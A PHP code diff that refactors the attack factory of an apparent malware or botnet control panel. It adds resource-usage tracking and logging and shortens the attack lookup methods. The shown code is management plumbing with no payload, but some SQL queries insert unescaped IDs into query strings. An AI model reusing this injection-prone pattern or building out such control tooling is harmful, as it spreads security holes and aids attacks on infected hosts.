@@ -7,6 +7,8 @@ namespace Kelvinho\Virus\Attack;
 use Kelvinho\Virus\Id\IdGenerator;
 use Kelvinho\Virus\Network\RequestData;
 use Kelvinho\Virus\Session\Session;
+use Kelvinho\Virus\Singleton\Logs;
+use Kelvinho\Virus\Usage\UsageFactory;
 use Kelvinho\Virus\User\UserFactory;
 use Kelvinho\Virus\Virus\VirusFactory;
 use mysqli;
@@ -27,11 +29,12 @@ class AttackFactoryImp implements AttackFactory {
     private IdGenerator $idGenerator;
     private mysqli $mysqli;
     private PackageRegistrar $packageRegistrar;
+    private UsageFactory $usageFactory;
 
     public function __construct() {
     }
 
-    public function addContext(RequestData $requestData, Session $session, UserFactory $userFactory, VirusFactory $virusFactory, IdGenerator $idGenerator, mysqli $mysqli, PackageRegistrar $packageRegistrar) {
+    public function addContext(RequestData $requestData, Session $session, UserFactory $userFactory, VirusFactory $virusFactory, IdGenerator $idGenerator, mysqli $mysqli, PackageRegistrar $packageRegistrar, UsageFactory $usageFactory) {
         $this->requestData = $requestData;
         $this->session = $session;
         $this->userFactory = $userFactory;
@@ -39,6 +42,7 @@ class AttackFactoryImp implements AttackFactory {
         $this->idGenerator = $idGenerator;
         $this->mysqli = $mysqli;
         $this->packageRegistrar = $packageRegistrar;
+        $this->usageFactory = $usageFactory;
     }
 
     /**
@@ -54,6 +58,7 @@ class AttackFactoryImp implements AttackFactory {
         if (!$this->packageRegistrar->hasPackage($attack_package)) throw new AttackPackageNotFound();
         $attack_id = $this->idGenerator->newAttackId();
         $classname = $this->packageRegistrar->getClassName($attack_package);
+        $usage = $this->usageFactory->new();
 
         mkdir(DATA_FILE . "/attacks/$attack_id");
         touch(DATA_FILE . "/attacks/$attack_id/profile.txt");
@@ -61,15 +66,17 @@ class AttackFactoryImp implements AttackFactory {
 
         $attack = new $classname();
         /** @var AttackBase $attack */
-        $attack->setContext($this->requestData, $this->session, $this->userFactory, $this->virusFactory, $this, $this->mysqli, $this->packageRegistrar);
+        $attack->setContext($this->requestData, $this->session, $this->userFactory, $this->virusFactory, $this, $this->mysqli, $this->packageRegistrar, $this->usageFactory);
         $attack->setAttackId($attack_id);
         $attack->setVirusId($virus_id);
         $attack->setPackageDbName($attack_package);
         $attack->setName($name);
 
-        $this->mysqli->query("insert into attacks (attack_id, virus_id, attack_package, status, name) values (\"$attack_id\", \"$virus_id\", \"$attack_package\", \"" . $attack->getStatus() . "\", \"" . $this->mysqli->escape_string($name) . "\")");
+        if (!$this->mysqli->query("insert into attacks (attack_id, virus_id, attack_package, resource_usage_id) values (\"$attack_id\", \"$virus_id\", \"$attack_package\", " . $usage->getId() . ")")) Logs::mysql($this->mysqli);
         $attack->saveState();
-        return $this->get($attack_id);
+        $attack = $this->get($attack_id);
+        $attack->setStaticUsage();
+        return $attack;
     }
 
     /**
@@ -79,10 +86,8 @@ class AttackFactoryImp implements AttackFactory {
      * @return AttackBase The attack
      */
     public function get(string $attack_id): AttackBase {
-        $answer = $this->mysqli->query("select name, attack_package, virus_id, status, executed_time from attacks where attack_id = \"$attack_id\"");
-        if (!$answer) throw new AttackNotFound();
-        $row = $answer->fetch_assoc();
-        if (!$row) throw new AttackNotFound();
+        if (!$answer = $this->mysqli->query("select attack_package from attacks where attack_id = \"$attack_id\"")) throw new AttackNotFound();
+        if (!$row = $answer->fetch_assoc()) throw new AttackNotFound();
 
         $packageDbName = $row["attack_package"];
         if (!$this->packageRegistrar->hasPackage($packageDbName)) throw new AttackPackageNotFound();
@@ -90,14 +95,9 @@ class AttackFactoryImp implements AttackFactory {
         /** @var AttackBase $attack */
         $attack = new $classname();
 
-        $attack->setContext($this->requestData, $this->session, $this->userFactory, $this->virusFactory, $this, $this->mysqli, $this->packageRegistrar);
+        $attack->setContext($this->requestData, $this->session, $this->userFactory, $this->virusFactory, $this, $this->mysqli, $this->packageRegistrar, $this->usageFactory);
         $attack->setAttackId($attack_id);
-        $attack->setVirusId($row["virus_id"]);
-        $attack->setPackageDbName($row["attack_package"]);
-        $attack->setName($row["name"]);
-        $attack->setStatus($row["status"]);
-        $attack->setExecutedTime($row["executed_time"]);
-        $attack->loadFromDisk();
+        $attack->loadState();
         return $attack;
     }
 
@@ -108,13 +108,8 @@ class AttackFactoryImp implements AttackFactory {
      * @return bool Whether it exists or not
      */
     public function exists(string $attack_id): bool {
-        $answer = $this->mysqli->query("select attack_id from attacks where attack_id = \"" . $this->mysqli->escape_string($attack_id) . "\"");
-        if ($answer) {
-            $row = $answer->fetch_assoc();
-            if ($row) {
-                return true;
-            }
-        }
-        return false;
+        if (!$answer = $this->mysqli->query("select attack_id from attacks where attack_id = \"" . $this->mysqli->escape_string($attack_id) . "\"")) return false;
+        if (!$row = $answer->fetch_assoc()) return false;
+        return true;
     }
 }
